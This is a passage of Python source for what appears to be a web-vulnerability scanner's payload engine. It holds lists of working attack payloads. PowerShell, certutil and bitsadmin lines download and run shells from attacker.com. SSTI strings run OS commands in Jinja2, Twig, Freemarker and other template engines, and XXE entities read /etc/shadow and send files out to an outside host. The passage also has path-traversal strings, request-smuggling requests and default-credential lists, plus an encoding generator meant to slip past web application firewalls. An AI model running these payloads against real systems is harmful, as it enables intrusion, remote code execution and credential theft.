            '; ruby -e "system(\'id\')"',
            '; perl -e "system(\'id\')"',
        ]:
            p.append(Payload(v, "cmdi", "linux", source="core"))
        
        # Windows
        for v in [
            '& whoami', '| whoami', '&& whoami', '|| whoami',
            '& dir', '| dir', '& type C:\\Windows\\System32\\drivers\\etc\\hosts',
            '| type C:\\Windows\\System32\\drivers\\etc\\hosts',
            '& net user', '| net user',
            '& ipconfig', '| ipconfig',
            '& systeminfo', '| systeminfo',
            '& ping -n 3 attacker.com',
            'powershell -c "whoami"',
            'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\'http://attacker.com/shell.ps1\')"',
            'powershell -enc <base64>',
            'certutil -urlcache -f http://attacker.com/shell.exe shell.exe',
            'bitsadmin /transfer job http://attacker.com/shell.exe C:\\temp\\shell.exe',
            'cmd /c whoami', 'cmd /c dir',
            '& timeout 5 &',
            'ping -n 5 attacker.com',
        ]:
            p.append(Payload(v, "cmdi", "windows", source="core"))
        
        return p

    def _core_ssti(self) -> List[Payload]:
        """Core SSTI payloads."""
        p = []
        # Detection
        for v in ['{{7*7}}', '${7*7}', '<%= 7*7 %>', '#{7*7}', '{{7*\'7\'}}',
                   '${7*\'7\'}', '<%= 7*\'7\' %>', '#{7*\'7\'}']:
            p.append(Payload(v, "ssti", "detection", source="core"))
        
        # Jinja2
        for v in [
            '{{config}}', '{{self.__class__.__mro__}}',
            '{{\'\'.__class__.__mro__[2].__subclasses__()}}',
            '{{config.items()}}', '{{request.application.__globals__}}',
            '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}',
            '{{lipsum.__globals__[\'os\'].popen(\'id\').read()}}',
            '{{cycler.__init__.__globals__[\'os\'].popen(\'id\').read()}}',
            '{{joiner.__init__.__globals__[\'os\'].popen(\'id\').read()}}',
            '{{namespace.__init__.__globals__[\'os\'].popen(\'id\').read()}}',
            '{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__==\'catch_warnings\'%}{{c.__init__.__globals__[\'builtins\'].eval("__import__(\'os\').popen(\'id\').read()")}}{%endif%}{%endfor%}',
            '{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("id")|attr("read")()}}',
            '{{()|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5fbase\x5f\x5f")|attr("\x5f\x5fsubclasses\x5f\x5f")()}}',
        ]:
            p.append(Payload(v, "ssti", "jinja2", framework="jinja2", source="core"))
        
        # Twig
        for v in [
            '{{7*7}}', '{{_self}}', '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
            '{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}',
            '{{[0]|reduce("system",["id"])}}',
            '{{["id"]|filter("system")}}',
        ]:
            p.append(Payload(v, "ssti", "twig", framework="twig", source="core"))
        
        # Freemarker
        for v in [
            '${7*7}', '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }',
            '${"freemarker.template.utility.Execute"?new()("id")}',
            '<#assign objectloader="freemarker.template.utility.ObjectConstructor"?new()>${ objectloader("java.lang.ProcessBuilder",["id"]).start()}',
        ]:
            p.append(Payload(v, "ssti", "freemarker", framework="freemarker", source="core"))
        
        # Velocity
        for v in [
            '#set($x="")', '#set($rt=$x.forName("java.lang.Runtime"))',
            '#set($chr=$x.forName("java.lang.Character"))',
            '#set($str=$x.forName("java.lang.String"))',
            '#set($ex=$rt.getRuntime().exec("id"))',
        ]:
            p.append(Payload(v, "ssti", "velocity", framework="velocity", source="core"))
        
        # ERB
        for v in [
            '<%= system("id") %>', '<%= `id` %>',
            '<%= IO.popen("id").readlines() %>',
            '<%= require "open3"; Open3.capture2("id") %>',
        ]:
            p.append(Payload(v, "ssti", "erb", framework="erb", source="core"))
        
        # Pug
        for v in [
            '#{7*7}', '#{global.process.mainModule.require("child_process").execSync("id")}',
            '#{" ".constructor.constructor("return this.process.mainModule.require(\"child_process\").execSync(\"id\")")()}',
        ]:
            p.append(Payload(v, "ssti", "pug", framework="pug", source="core"))
        
        return p

    def _core_xxe(self) -> List[Payload]:
        """Core XXE payloads."""
        p = []
        for v in [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo>test</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?x=%file;\'>">%eval;%exfil;]><foo>test</foo>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/cmdline">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>',
        ]:
            p.append(Payload(v, "xxe", "basic", source="core"))
        
        # SVG XXE
        for v in [
            '<?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>',
        ]:
            p.append(Payload(v, "xxe", "svg", source="core"))
        
        return p

    def _core_traversal(self) -> List[Payload]:
        """Core path traversal payloads."""
        p = []
        for v in [
            '../../../etc/passwd', '....//....//....//etc/passwd',
            '..%2f..%2f..%2fetc%2fpasswd', '..%252f..%252f..%252fetc%252fpasswd',
            '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            '..%255c..%255c..%255cetc%255cpasswd',
            '..\[\.].\[\.].\\etc\\passwd', '..%5c..%5c..%5cetc%5cpasswd',
            '....\/....\/....\/etc\/passwd',
            'file:///etc/passwd', 'file:///proc/self/environ',
            '/etc/passwd', 'C:\\Windows\\System32\\drivers\\etc\\hosts',
            '..%00/..%00/..%00/etc/passwd',
            '..%00..%00..%00etc%00passwd',
            '....//....//....//etc/passwd%00',
            '....//....//....//etc/passwd%00.jpg',
            '..;/..;/..;/etc/passwd',
            '..%0d/..%0d/..%0d/etc/passwd',
            '..%0a/..%0a/..%0a/etc/passwd',
            '..%0d%0a/..%0d%0a/..%0d%0a/etc/passwd',
            '..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd',
            '..%252f..%252f..%252fetc/passwd',
            '..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd',
            '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd',
            '..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows\\system32\\drivers\\etc\\hosts',
            '..\[\.].\[\.].\[\.].\[\.].\[\.].\[\.].\[\.].\[\.].\[\.].\[\.].\[\.].\[\.].\[\.].\[\.].\[\.].\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd',
            '/....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd',
            '..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/etc/passwd',
        ]:
            p.append(Payload(v, "traversal", "linux", source="core"))
        
        return p

    def _core_smuggling(self) -> List[Payload]:
        """Core HTTP request smuggling payloads."""
        p = []
        for v in [
            'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG',
            'POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n',
            'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n',
            'POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nX',
        ]:
            p.append(Payload(v, "smuggling", "clte", source="core"))
        
        return p

    def _core_idor(self) -> List[Payload]:
        """Core IDOR test payloads."""
        p = []
        for v in [
            '1', '2', '3', '0', '-1', 'admin', 'test', 'user',
            '00000000-0000-0000-0000-000000000001',
            'ffffffff-ffff-ffff-ffff-ffffffffffff',
            '../admin', '../../admin', '../1', '0x1', '1.0',
        ]:
            p.append(Payload(v, "idor", "basic", source="core"))
        
        return p

    def _core_redirect(self) -> List[Payload]:
        """Core open redirect payloads."""
        p = []
        for v in [
            'https://evil.com', '//evil.com', '///evil.com',
            '////evil.com', 'https:evil.com', 'https:/evil.com',
            'https://evil.com%00.target.com', 'https://evil.com%0d%0a.target.com',
            'https://target.com@evil.com', 'https://evil.com#@target.com',
            'https://evil.com%23@target.com', 'https://evil.com%2523@target.com',
            'https://evil.com\\\[\.]target.com', 'https://evil.com\[\.]target.com',
            'https://evil.com/.target.com', 'https://evil.com#target.com',
            'https://evil.com?target.com', 'https://evil.com%00.target.com',
            'javascript:alert(1)', 'data:text/html,<script>alert(1)</script>',
            '//evil.com/%2e%2e', '///evil.com/%2e%2e',
            '/\\evil.com', '////evil.com', 'https:///evil.com',
            'https://evil.com%09target.com', 'https://evil.com%0atarget.com',
            'https://evil.com%0dtarget.com',
        ]:
            p.append(Payload(v, "redirect", "basic", source="core"))
        
        return p

    def _core_cors(self) -> List[Payload]:
        """Core CORS misconfiguration test payloads."""
        p = []
        for v in [
            'https://evil.com', 'https://attacker.com', 'null',
            'https://evil.com.example.com', 'https://example.com.evil.com',
            'https://subdomain.example.com', '*.example.com',
            'https://example.com', 'http://localhost',
        ]:
            p.append(Payload(v, "cors", "basic", source="core"))
        
        return p

    def _core_secrets(self) -> List[Payload]:
        """Core secret detection patterns."""
        p = []
        patterns = [
            ('AKIA[0-9A-Z]{16}', 'AWS Access Key'),
            ('ASIA[0-9A-Z]{16}', 'AWS Temporary Access Key'),
            ('sk-[A-Za-z0-9]{48}', 'OpenAI API Key'),
            ('ghp_[A-Za-z0-9]{36}', 'GitHub Personal Access Token'),
            ('gho_[A-Za-z0-9]{36}', 'GitHub OAuth Token'),
            ('github_pat_[A-Za-z0-9]{22}_[A-Za-z0-9]{59}', 'GitHub Fine-grained PAT'),
            ('glpat-[A-Za-z0-9[\-]]{20}', 'GitLab Personal Access Token'),
            ('xox[bporas]-[A-Za-z0-9[\-]]+', 'Slack Token'),
            ('sk-[A-Za-z0-9]{32}', 'Stripe Secret Key'),
            ('rk_[A-Za-z0-9]{24}', 'Rackspace API Key'),
            ('SG[\.][A-Za-z0-9[\-]]{22}[\.][A-Za-z0-9[\-]]{43}', 'SendGrid API Key'),
            ('key-[A-Za-z0-9]{32}', 'Mailgun API Key'),
            ('AC[a-z0-9]{32}', 'Twilio Account SID'),
            ('SK[a-z0-9]{32}', 'Twilio Auth Token'),
            ('AIza[0-9A-Za-z[\-]_]{35}', 'Google API Key'),
            ('ya29[\.][0-9A-Za-z[\-]_]+', 'Google OAuth Token'),
            ('sk_live_[A-Za-z0-9]{24}', 'Stripe Live Key'),
            ('rk_live_[A-Za-z0-9]{24}', 'Stripe Restricted Key'),
            ('sq0csp-[A-Za-z0-9[\-]_]{43}', 'Square OAuth Secret'),
            ('access_token\$production\$[a-z0-9]{16}\$[a-z0-9]{32}', 'PayPal Access Token'),
            ('-----BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE KEY-----', 'Private Key'),
            ('eyJ[A-Za-z0-9[\-]_]+[\.]eyJ[A-Za-z0-9[\-]_]+[\.][A-Za-z0-9[\-]_.+/=]+', 'JWT Token'),
            ('[A-Za-z0-9]{32}', 'Generic API Key (32 chars)'),
            ('[A-Za-z0-9]{40}', 'Generic API Key (40 chars)'),
            ('[A-Za-z0-9]{64}', 'Generic API Key (64 chars)'),
        ]
        for pattern, desc in patterns:
            p.append(Payload(pattern, "secrets", "regex", description=desc, source="core"))
        
        return p

    def _core_headers(self) -> List[Payload]:
        """Core security header checks."""
        p = []
        headers = [
            ('Content-Security-Policy', 'Missing CSP header', 'MEDIUM'),
            ('X-Frame-Options', 'Missing X-Frame-Options (Clickjacking)', 'MEDIUM'),
            ('X-Content-Type-Options', 'Missing X-Content-Type-Options', 'LOW'),
            ('Strict-Transport-Security', 'Missing HSTS header', 'MEDIUM'),
            ('X-XSS-Protection', 'Missing X-XSS-Protection', 'LOW'),
            ('Referrer-Policy', 'Missing Referrer-Policy', 'LOW'),
            ('Permissions-Policy', 'Missing Permissions-Policy', 'LOW'),
            ('Cross-Origin-Embedder-Policy', 'Missing COEP header', 'LOW'),
            ('Cross-Origin-Opener-Policy', 'Missing COOP header', 'LOW'),
            ('Cross-Origin-Resource-Policy', 'Missing CORP header', 'LOW'),
        ]
        for header, desc, sev in headers:
            p.append(Payload(header, "headers", "check", description=desc, severity=sev, source="core"))
        
        return p

    def _core_race(self) -> List[Payload]:
        """Core race condition test payloads."""
        p = []
        for v in [
            'concurrent_10', 'concurrent_50', 'concurrent_100',
            'parallel_get', 'parallel_post', 'same_request_20x',
        ]:
            p.append(Payload(v, "race", "basic", source="core"))
        
        return p

    def _core_auth(self) -> List[Payload]:
        """Core auth bypass payloads."""
        p = []
        for v in [
            'admin:admin', 'admin:password', 'admin:123456',
            'admin:admin123', 'root:root', 'root:toor',
            'admin:', 'admin:admin1234', 'admin:password123',
            'test:test', 'guest:guest', 'user:user',
            'administrator:administrator', 'sa:sa',
        ]:
            p.append(Payload(v, "auth", "default_creds", source="core"))
        
        return p

    # ============================================================
    # DETECTION PATTERNS — Regex for finding vulnerabilities
    # ============================================================

    def get_detection_patterns(self, vuln_type: str) -> List[DetectionPattern]:
        """Get detection patterns for a vulnerability type."""
        if vuln_type in self._patterns:
            return self._patterns[vuln_type]
        
        patterns = {
            "sqli": [
                DetectionPattern(r"SQL syntax.*?MySQL", "sqli", "mysql", "MySQL syntax error"),
                DetectionPattern(r"Warning.*?mysql_", "sqli", "mysql", "MySQL warning"),
                DetectionPattern(r"PostgreSQL.*?ERROR", "sqli", "postgresql", "PostgreSQL error"),
                DetectionPattern(r"Warning.*?pg_", "sqli", "postgresql", "PostgreSQL warning"),
                DetectionPattern(r"Driver.*? SQL[[\-]\_\ ]*Server", "sqli", "mssql", "MSSQL driver error"),
                DetectionPattern(r"OLE DB.*? SQL Server", "sqli", "mssql", "MSSQL OLE DB error"),
                DetectionPattern(r"\bORA-[0-9]{4}", "sqli", "oracle", "Oracle error code"),
                DetectionPattern(r"SQLite.*?Error", "sqli", "sqlite", "SQLite error"),
                DetectionPattern(r"Unclosed quotation mark", "sqli", dbms="generic", description="Unclosed quote"),
                DetectionPattern(r"you have an error in your sql", "sqli", dbms="generic", description="Generic SQL error"),
                DetectionPattern(r"syntax error.*?SQL", "sqli", dbms="generic", description="SQL syntax error"),
            ],
            "xss": [
                DetectionPattern(r"<script>alert\(1\)</script>", "xss", description="Script tag reflected"),
                DetectionPattern(r"onerror=alert\(1\)", "xss", description="Event handler reflected"),
                DetectionPattern(r"onload=alert\(1\)", "xss", description="Onload handler reflected"),
                DetectionPattern(r"javascript:alert", "xss", description="Javascript protocol"),
            ],
            "ssrf": [
                DetectionPattern(r"root:.*:0:0:", "ssrf", description="etc/passwd content"),
                DetectionPattern(r"\[default\]", "ssrf", description="AWS metadata"),
                DetectionPattern(r"ami-id", "ssrf", description="AWS AMI ID"),
                DetectionPattern(r"computeMetadata", "ssrf", description="GCP metadata"),
                DetectionPattern(r"metadata/instance", "ssrf", description="Azure metadata"),
            ],
            "cmdi": [
                DetectionPattern(r"uid=\d+\(\w+\)", "cmdi", description="Unix uid output"),
                DetectionPattern(r"root:.*:0:0:", "cmdi", description="etc/passwd content"),
                DetectionPattern(r"Windows IP Configuration", "cmdi", description="Windows ipconfig"),
                DetectionPattern(r"Volume Serial Number", "cmdi", description="Windows dir output"),
            ],
            "ssti": [
                DetectionPattern(r"49", "ssti", description="7*7=49 (template expression evaluated)"),
                DetectionPattern(r"__class__", "ssti", description="Python class access"),
                DetectionPattern(r"__mro__", "ssti", description="Python MRO access"),
                DetectionPattern(r"__subclasses__", "ssti", description="Python subclasses access"),
            ],
            "xxe": [
                DetectionPattern(r"root:.*:0:0:", "xxe", description="etc/passwd content"),
                DetectionPattern(r"\[boot loader\]", "xxe", description="Windows win.ini content"),
                DetectionPattern(r"ENTITY", "xxe", description="XML entity in response"),
            ],
            "traversal": [
                DetectionPattern(r"root:.*:0:0:", "traversal", description="etc/passwd content"),
                DetectionPattern(r"\[boot loader\]", "traversal", description="Windows win.ini"),
                DetectionPattern(r"\[fonts\]", "traversal", description="Windows win.ini fonts section"),
            ],
        }
        
        self._patterns[vuln_type] = patterns.get(vuln_type, [])
        return self._patterns[vuln_type]

    # ============================================================
    # TRANSFORMATION ENGINE — Generate variants dynamically
    # ============================================================

    def generate_variants(self, payload: Payload, max_variants: int = 20) -> List[Payload]:
        """Generate encoding/case/comment variants of a payload.
        
        This is the key to being lightweight yet comprehensive:
        Store 1 core payload → Generate 20 variants.
        500 cores × 20 variants = 10,000 effective payloads.
        """
        variants = []
        value = payload.value
        
        # URL encoding
        url_encoded = self._url_encode(value)
        if url_encoded != value:
            variants.append(Payload(url_encoded, payload.vuln_type, payload.sub_type,
                                   description=f"URL encoded: {payload.description}",
                                   encoding="url", source="generated",
                                   dbms=payload.dbms, context=payload.context,
                                   waf_bypass=True))
        
        # Double URL encoding
        double_url = self._url_encode(url_encoded)
        if double_url != url_encoded:
            variants.append(Payload(double_url, payload.vuln_type, payload.sub_type,
                                   description=f"Double URL encoded: {payload.description}",
                                   encoding="double_url", source="generated",
                                   dbms=payload.dbms, context=payload.context,
                                   waf_bypass=True))
        
        # HTML entity encoding
        html_entity = self._html_entity_encode(value)
        if html_entity != value:
            variants.append(Payload(html_entity, payload.vuln_type, payload.sub_type,
                                   description=f"HTML entity encoded: {payload.description}",
                                   encoding="html_entity", source="generated",
                                   dbms=payload.dbms, context=payload.context,
                                   waf_bypass=True))
        
        # Unicode encoding
        unicode_enc = self._unicode_encode(value)
        if unicode_enc != value:
            variants.append(Payload(unicode_enc, payload.vuln_type, payload.sub_type,
                                   description=f"Unicode encoded: {payload.description}",
                                   encoding="unicode", source="generated",
                                   dbms=payload.dbms, context=payload.context,
                                   waf_bypass=True))
        
        # Case variations (for SQL keywords)
        if payload.vuln_type == "sqli":
            case_var = self._case_variation(value)
            if case_var != value:
                variants.append(Payload(case_var, payload.vuln_type, payload.sub_type,
                                       description=f"Case variation: {payload.description}",
                                       encoding="case", source="generated",
                                       dbms=payload.dbms, waf_bypass=True))
        
        # Comment injection (SQL)
        if payload.vuln_type == "sqli":
            comment_var = self._comment_injection(value)
            if comment_var != value:
                variants.append(Payload(comment_var, payload.vuln_type, payload.sub_type,
                                       description=f"Comment injection: {payload.description}",
                                       encoding="comment", source="generated",
                                       dbms=payload.dbms, waf_bypass=True))
        
        # Whitespace substitution
        ws_var = self._whitespace_substitution(value)
        if ws_var != value:
            variants.append(Payload(ws_var, payload.vuln_type, payload.sub_type,
                                   description=f"Whitespace substitution: {payload.description}",
                                   encoding="whitespace", source="generated",
                                   dbms=payload.dbms, context=payload.context,
                                   waf_bypass=True))

        # Hex encoding — encode numeric payloads as 0x + hex
        if value.isdigit() or (value.startswith("-") and value[1:].isdigit()):
            hex_val = hex(int(value))
            hex_enc = value.replace(value, f"0x{hex_val[2:]}")
            if hex_enc != value:
                variants.append(Payload(hex_enc, payload.vuln_type, payload.sub_type,
                                       description=f"Hex encoding: {payload.description}",
                                       encoding="hex", source="generated",
                                       dbms=payload.dbms, waf_bypass=True))

        # Unicode normalization variants — replace chars with unicode lookalikes
        unicode_norm = self._unicode_normalization(value)
        if unicode_norm != value:
            variants.append(Payload(unicode_norm, payload.vuln_type, payload.sub_type,
                                   description=f"Unicode normalization: {payload.description}",
                                   encoding="unicode_norm", source="generated",
                                   dbms=payload.dbms, context=payload.context,
                                   waf_bypass=True))

        # Mixed case variants — systematic alternating case
        if payload.vuln_type in ("sqli", "xss", "cmdi"):
            mixed_var = self._mixed_case_variation(value)
            if mixed_var != value:
                variants.append(Payload(mixed_var, payload.vuln_type, payload.sub_type,
                                       description=f"Mixed case: {payload.description}",
                                       encoding="mixed_case", source="generated",
                                       dbms=payload.dbms, waf_bypass=True))

        return variants[:max_variants]

    def _url_encode(self, s: str) -> str:
        """URL encode special characters."""
        import urllib.parse
        return urllib.parse.quote(s, safe='')

    def _html_entity_encode(self, s: str) -> str:
        """HTML entity encode."""
        return ''.join(f'&#{ord(c)};' for c in s)

    def _unicode_encode(self, s: str) -> str:
        """Unicode encode special characters."""
        result = []
        for c in s:
            if ord(c) > 127 or c in "'\"<>=&;/\\(){}[]":
                result.append(f'%u{ord(c):04x}')
            else:
                result.append(c)
        return ''.join(result)

    def _case_variation(self, s: str) -> str:
        """Random case variation for SQL keywords."""
        import random
        random.seed(hash(s))
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'INSERT',
                     'UPDATE', 'DELETE', 'DROP', 'TABLE', 'VERSION', 'SLEEP',
                     'BENCHMARK', 'WAITFOR', 'DELAY', 'EXEC', 'CONVERT',
                     'CAST', 'EXTRACTVALUE', 'UPDATEXML', 'NULL', 'AS']
        result = s
        for kw in keywords:
            if kw.lower() in result.lower():
                mixed = ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in kw)
                result = re.sub(re.escape(kw), mixed, result, flags=re.IGNORECASE)
        return result

    def _comment_injection(self, s: str) -> str:
        """Inject SQL comments around keywords, using word boundaries to avoid substring corruption."""
        import random
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'ORDER', 'GROUP']
        result = s
        for kw in keywords:
            if re.search(rf'\b{re.escape(kw)}\b', result, re.IGNORECASE):
                comment = f'/**/{kw}/**/'
                result = re.sub(rf'\b{re.escape(kw)}\b', comment, result, flags=re.IGNORECASE)
        return result

    def _whitespace_substitution(self, s: str) -> str:
        """Replace spaces with alternative whitespace, cycling through all variants."""
        if ' ' not in s:
            return s
        ws_chars = ['%09', '%0a', '%0d', '%a0', '/**/']
        for ws in ws_chars:
            result = s.replace(' ', ws)
            if result != s:
                return result
        return s

    def _unicode_normalization(self, s: str) -> str:
        """Replace ASCII chars with Unicode lookalikes."""
        mapping = {
            'a': '\u0430', 'A': '\u0410',
            'e': '\u0435', 'E': '\u0415',
            'o': '\u043E', 'O': '\u041E',
            'c': '\u0441', 'C': '\u0421',
            'p': '\u0440', 'P': '\u0420',
            'x': '\u0445', 'X': '\u0425',
            'y': '\u0443', 'Y': '\u0423',
            'M': '\u041C', 'H': '\u041D',
            'T': '\u0422', 'K': '\u041A',
        }
        result = ''.join(mapping.get(c, c) for c in s)
        return result

    def _mixed_case_variation(self, s: str) -> str:
        """Systematic alternating case."""
        result_chars = []
        for i, c in enumerate(s):
            if c.isalpha():
                result_chars.append(c.upper() if i % 2 == 0 else c.lower())
            else:
                result_chars.append(c)
        return ''.join(result_chars)

    # ============================================================
    # CONTEXT-AWARE SELECTION
    # ============================================================

    def get_payloads(self, vuln_type: str, context: Dict[str, Any] = None) -> List[Payload]:
        """Get payloads for a vulnerability type, with context-aware filtering.
        
        Args:
            vuln_type: sqli, xss, ssrf, cmdi, ssti, xxe, traversal, etc.
            context: Optional dict with:
                - dbms: mysql, postgresql, mssql, oracle, sqlite
                - framework: jinja2, twig, angular, vue, react, erb
                - context: html, attribute, js, url, json, xml
                - waf_detected: True/False
                - parameter_type: string, numeric, json, xml
                
        Returns:
            List of Payload objects, filtered and expanded with variants.
        """
        context = context or {}
        
        # Load core payloads
        if vuln_type not in self._loaded_types:
            self._payloads[vuln_type] = self._get_core_payloads(vuln_type)
            self._loaded_types.add(vuln_type)
        
        payloads = list(self._payloads.get(vuln_type, []))
        
        # Add learned payloads
        learned = self._learned.get(vuln_type, [])
        for lp in learned:
            if lp not in [p.value for p in payloads]:
                payloads.append(Payload(lp, vuln_type, "learned", source="learned", confidence=0.9))
        
        # Context filtering
        if context.get("dbms"):
            dbms = context["dbms"].lower()
            dbms_payloads = [p for p in payloads if p.dbms == dbms or p.dbms == ""]
            payloads = dbms_payloads
        
        if context.get("framework"):
            fw = context["framework"].lower()
            fw_payloads = [p for p in payloads if p.framework == fw or p.framework == ""]
            payloads = fw_payloads
        
        if context.get("context"):
            ctx = context["context"].lower()
            ctx_payloads = [p for p in payloads if p.context == ctx or p.context == ""]
            payloads = ctx_payloads
        
        # Generate variants for WAF bypass or when more payloads needed
        if context.get("waf_detected", False):
            all_payloads = []
            for p in payloads:
                all_payloads.append(p)
                all_payloads.extend(self.generate_variants(p, max_variants=5))
            payloads = all_payloads
        
        return payloads

    def get_payload_values(self, vuln_type: str, context: Dict[str, Any] = None) -> List[str]:
        """Get just the payload strings (for backward compatibility)."""
        return [p.value for p in self.get_payloads(vuln_type, context)]

    # ============================================================
    # LEARNING SYSTEM — Cache what works
    # ============================================================

    def learn(self, vuln_type: str, payload: str, target: str = "", success: bool = True):
        """Record a successful/failed payload for learning.
        
        When a payload works against a specific target/framework/WAF,
        we remember it for future use.
        """
        if success:
            if vuln_type not in self._learned:
                self._learned[vuln_type] = []
            if payload not in self._learned[vuln_type]:
                self._learned[vuln_type].append(payload)
                logger.info(f"Learned successful payload for {vuln_type}: {payload[:50]}...")
        
        # Save to disk
        self._save_learned()

    def _load_learned(self):
        """Load learned payloads from disk."""
        cache_file = self._cache_dir / "learned_payloads.json"
        if cache_file.exists():
            try:
                with open(cache_file) as f:
                    self._learned = json.load(f)
            except Exception:
                self._learned = {}

    def _save_learned(self):
        """Save learned payloads to disk."""
        cache_file = self._cache_dir / "learned_payloads.json"
        try:
            with open(cache_file, "w") as f:
                json.dump(self._learned, f, indent=2)
        except Exception as e:
            logger.warning(f"Failed to save learned payloads: {e}")

    def get_learned(self, vuln_type: str) -> List[str]:
        """Get learned successful payloads for a vuln type."""
        return self._learned.get(vuln_type, [])

    # ============================================================
    # EXTERNAL PAYLOAD IMPORT
    # ============================================================

    def import_payloads_from_file(self, filepath: str, vuln_type: str, sub_type: str = "") -> int:
        """Import payloads from a text file (one payload per line).
        Compatible with PayloadsAllTheThings format."""
        count = 0
        try:
            with open(filepath) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        if vuln_type not in self._payloads:
                            self._payloads[vuln_type] = []
                        self._payloads[vuln_type].append(
                            Payload(line, vuln_type, sub_type, source="imported")
                        )
                        count += 1
            logger.info(f"Imported {count} payloads from {filepath}")
        except Exception as e:
            logger.error(f"Failed to import payloads from {filepath}: {e}")
        return count

    def import_from_payloadsallthethings(self, base_dir: str) -> int:
        """Import payloads from PayloadsAllTheThings directory structure."""
        total = 0
        base = Path(base_dir)
        if not base.exists():
            logger.warning(f"Directory not found: {base_dir}")
            return 0
        
        mapping = {
            "SQL Injection": "sqli",
            "XSS Injection": "xss",
            "SSRF Injection": "ssrf",
            "Command Injection": "cmdi",
            "Server Side Template Injection": "ssti",
            "XXE Injection": "xxe",
            "Directory Traversal": "traversal",
            "Open Redirect": "redirect",
            "CORS Misconfiguration": "cors",
        }
        
        for folder, vuln_type in mapping.items():
            folder_path = base / folder
            if folder_path.exists():
                for f in folder_path.glob("*.md"):
                    count = self._parse_markdown_payloads(f, vuln_type)
                    total += count
        
        logger.info(f"Imported {total} payloads from PayloadsAllTheThings")
        return total

    def _parse_markdown_payloads(self, filepath: Path, vuln_type: str) -> int:
        """Parse payloads from a PayloadsAllTheThings markdown file."""
        count = 0
        try:
            with open(filepath) as f:
                in_code_block = False
                for line in f:
                    if line.strip().startswith("```"):
                        in_code_block = not in_code_block
                        continue
                    if in_code_block:
                        payload = line.strip()
                        if payload and len(payload) > 2:
                            if vuln_type not in self._payloads:
                                self._payloads[vuln_type] = []
                            self._payloads[vuln_type].append(
                                Payload(payload, vuln_type, source="payloadsallthethings")
                            )
                            count += 1
        except Exception:
            pass
        return count

    # ============================================================
    # STATS
    # ============================================================

    def get_stats(self) -> Dict[str, Any]:
        """Get payload engine statistics."""
        core_counts = {}
        total_core = 0
        for vt in ["sqli", "xss", "ssrf", "cmdi", "ssti", "xxe", "traversal",
                     "smuggling", "idor", "redirect", "cors", "secrets", "headers",
                     "race", "auth"]:
            cores = self._get_core_payloads(vt)
            core_counts[vt] = len(cores)
            total_core += len(cores)
        
        learned_count = sum(len(v) for v in self._learned.values())
        
        return {
            "core_payloads": total_core,
            "by_type": core_counts,
            "learned_payloads": learned_count,
            "loaded_types": list(self._loaded_types),
            "cache_dir": str(self._cache_dir),
        }


# Singleton
